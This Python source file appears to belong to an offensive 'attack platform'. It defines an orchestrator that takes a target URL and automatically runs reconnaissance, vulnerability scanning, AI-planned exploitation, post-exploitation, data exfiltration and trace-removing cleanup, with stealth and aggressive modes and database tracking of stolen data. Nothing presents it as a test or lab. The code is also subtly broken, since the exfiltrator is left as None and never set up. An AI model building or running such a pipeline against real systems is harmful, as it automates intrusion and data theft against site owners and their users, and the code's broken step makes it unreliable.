"""
dLNk Attack Platform - Attack Orchestrator
Orchestrates the entire attack workflow from reconnaissance to data exfiltration
"""

import asyncio
from typing import Dict, Any, List, Optional
from loguru import logger
from datetime import datetime
import traceback

from api.database.db_service import db
from core.target_analyzer import TargetAnalyzer
from core.ai_attack_planner import AIAttackPlanner
from core.vulnerability_scanner import VulnerabilityScanner
from core.exploit_executor import ExploitExecutor
from data_exfiltration.exfiltrator import DataExfiltrator


class AttackOrchestrator:
    """
    Main orchestrator for automated attacks
    Coordinates all phases of the attack lifecycle
    """
    
    def __init__(self):
        self.target_analyzer = TargetAnalyzer()
        self.ai_planner = AIAttackPlanner()
        self.vuln_scanner = VulnerabilityScanner()
        self.exploit_executor = ExploitExecutor()
        self.data_exfiltrator = None  # Will be initialized when needed
        
        self.attack_phases = [
            "reconnaissance",
            "scanning",
            "vulnerability_analysis",
            "attack_planning",
            "exploitation",
            "post_exploitation",
            "data_exfiltration",
            "cleanup"
        ]
    
    async def start_attack(
        self,
        attack_id: str,
        target_url: str,
        attack_mode: str = 'auto'
    ) -> Dict[str, Any]:
        """
        Start automated attack
        
        Args:
            attack_id: Attack session ID
            target_url: Target URL
            attack_mode: Attack mode ('auto', 'stealth', 'aggressive')
        
        Returns:
            Attack results
        """
        logger.info(f"🎯 Starting attack: {attack_id}")
        logger.info(f"   Target: {target_url}")
        logger.info(f"   Mode: {attack_mode}")
        
        results = {
            "attack_id": attack_id,
            "target_url": target_url,
            "attack_mode": attack_mode,
            "started_at": datetime.now().isoformat(),
            "phases": {},
            "vulnerabilities": [],
            "exploits": [],
            "exfiltrated_data": [],
            "status": "running",
            "error": None
        }
        
        try:
            # Update attack status
            await db.update_attack(
                attack_id,
                status="running",
                progress=0
            )
            
            # Phase 1: Reconnaissance
            logger.info("📡 Phase 1: Reconnaissance")
            await self._update_progress(attack_id, "reconnaissance", 10)
            
            recon_results = await self.target_analyzer.analyze(target_url)
            results["phases"]["reconnaissance"] = recon_results
            
            await db.update_attack(
                attack_id,
                target_info=recon_results
            )
            
            # Phase 2: Vulnerability Scanning
            logger.info("🔍 Phase 2: Vulnerability Scanning")
            await self._update_progress(attack_id, "scanning", 25)
            
            scan_results = await self.vuln_scanner.scan(
                target_url,
                recon_results
            )
            results["phases"]["scanning"] = scan_results
            results["vulnerabilities"] = scan_results.get("vulnerabilities", [])
            
            # Save vulnerabilities to database
            for vuln in results["vulnerabilities"]:
                await db.create_vulnerability(
                    attack_id=attack_id,
                    vuln_type=vuln["type"],
                    severity=vuln["severity"],
                    title=vuln["title"],
                    description=vuln.get("description"),
                    url=vuln.get("url"),
                    parameter=vuln.get("parameter"),
                    payload=vuln.get("payload"),
                    evidence=vuln.get("evidence"),
                    cvss_score=vuln.get("cvss_score"),
                    metadata=vuln.get("metadata", {})
                )
            
            # Phase 3: Vulnerability Analysis
            logger.info("🧠 Phase 3: AI-Powered Vulnerability Analysis")
            await self._update_progress(attack_id, "vulnerability_analysis", 40)
            
            analysis_results = await self.ai_planner.analyze_vulnerabilities(
                results["vulnerabilities"]
            )
            results["phases"]["vulnerability_analysis"] = analysis_results
            
            # Phase 4: Attack Planning
            logger.info("📋 Phase 4: AI-Powered Attack Planning")
            await self._update_progress(attack_id, "attack_planning", 50)
            
            attack_plan = await self.ai_planner.create_attack_plan(
                target_url=target_url,
                target_info=recon_results,
                vulnerabilities=results["vulnerabilities"],
                attack_mode=attack_mode
            )
            results["phases"]["attack_planning"] = attack_plan
            
            # Phase 5: Exploitation
            logger.info("💥 Phase 5: Exploitation")
            await self._update_progress(attack_id, "exploitation", 60)
            
            exploit_results = await self.exploit_executor.execute_plan(
                attack_id=attack_id,
                attack_plan=attack_plan,
                target_url=target_url,
                vulnerabilities=results["vulnerabilities"]
            )
            results["phases"]["exploitation"] = exploit_results
            results["exploits"] = exploit_results.get("exploits", [])
            
            # Phase 6: Post-Exploitation
            logger.info("🔓 Phase 6: Post-Exploitation")
            await self._update_progress(attack_id, "post_exploitation", 75)
            
            post_exploit_results = await self.exploit_executor.post_exploitation(
                attack_id=attack_id,
                successful_exploits=exploit_results.get("successful_exploits", [])
            )
            results["phases"]["post_exploitation"] = post_exploit_results
            
            # Phase 7: Data Exfiltration
            logger.info("📦 Phase 7: Data Exfiltration")
            await self._update_progress(attack_id, "data_exfiltration", 85)
            
            exfil_results = await self.data_exfiltrator.exfiltrate(
                attack_id=attack_id,
                target_url=target_url,
                access_info=post_exploit_results.get("access_info", {})
            )
            results["phases"]["data_exfiltration"] = exfil_results
            results["exfiltrated_data"] = exfil_results.get("files", [])
            
            # Phase 8: Cleanup
            logger.info("🧹 Phase 8: Cleanup")
            await self._update_progress(attack_id, "cleanup", 95)
            
            cleanup_results = await self._cleanup(
                attack_id=attack_id,
                target_url=target_url
            )
            results["phases"]["cleanup"] = cleanup_results
            
            # Complete
            results["status"] = "completed"
            results["completed_at"] = datetime.now().isoformat()
            
            await db.update_attack(
                attack_id,
                status="completed",
                progress=100,
                completed_at=datetime.now(),
                vulnerabilities_found=len(results["vulnerabilities"]),
                exploits_successful=len([e for e in results["exploits"] if e.get("success")]),
                data_exfiltrated_bytes=sum([f.get("size", 0) for f in results["exfiltrated_data"]])
            )
            
            logger.info(f"✅ Attack completed: {attack_id}")
            logger.info(f"   Vulnerabilities: {len(results['vulnerabilities'])}")
            logger.info(f"   Successful Exploits: {len([e for e in results['exploits'] if e.get('success')])}")
            logger.info(f"   Data Exfiltrated: {len(results['exfiltrated_data'])} files")
            
        except Exception as e:
            logger.error(f"❌ Attack failed: {e}")
            logger.error(traceback.format_exc())
            
            results["status"] = "failed"
            results["error"] = str(e)
            results["completed_at"] = datetime.now().isoformat()
            
            await db.update_attack(
                attack_id,
                status="failed",
                error_message=str(e),
                completed_at=datetime.now()
            )
        
        return results
    
    async def _update_progress(
        self,
        attack_id: str,
        phase: str,
        progress: int
    ):
        """Update attack progress"""
        await db.update_attack(
            attack_id,
            status=phase,
            progress=progress
        )
        logger.info(f"   Progress: {progress}%")
    
    async def _cleanup(
        self,
        attack_id: str,
        target_url: str
    ) -> Dict[str, Any]:
        """Cleanup after attack"""
        try:
            # Remove traces
            # Clear temporary files
            # Reset connections
            
            return {
                "success": True,
                "message": "Cleanup completed"
            }
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_attack_status(self, attack_id: str) -> Dict[str, Any]:
        """Get current attack status"""
        attack = await db.get_attack(attack_id)
        
        if not attack:
            return {
                "error": "Attack not found"
            }
        
        vulnerabilities = await db.list_vulnerabilities(attack_id)
        
        return {
            "attack_id": attack_id,
            "target_url": attack["target_url"],
            "status": attack["status"],
            "progress": attack["progress"],
            "started_at": attack["started_at"].isoformat(),
            "completed_at": attack["completed_at"].isoformat() if attack["completed_at"] else None,
            "vulnerabilities_found": len(vulnerabilities),
            "exploits_successful": attack["exploits_successful"],
            "data_exfiltrated_bytes": attack["data_exfiltrated_bytes"]
        }
    
    async def stop_attack(self, attack_id: str) -> bool:
        """Stop running attack"""
        try:
            await db.update_attack(
                attack_id,
                status="stopped",
                completed_at=datetime.now()
            )
            logger.info(f"🛑 Attack stopped: {attack_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to stop attack: {e}")
            return False


# Global orchestrator instance
orchestrator = AttackOrchestrator()

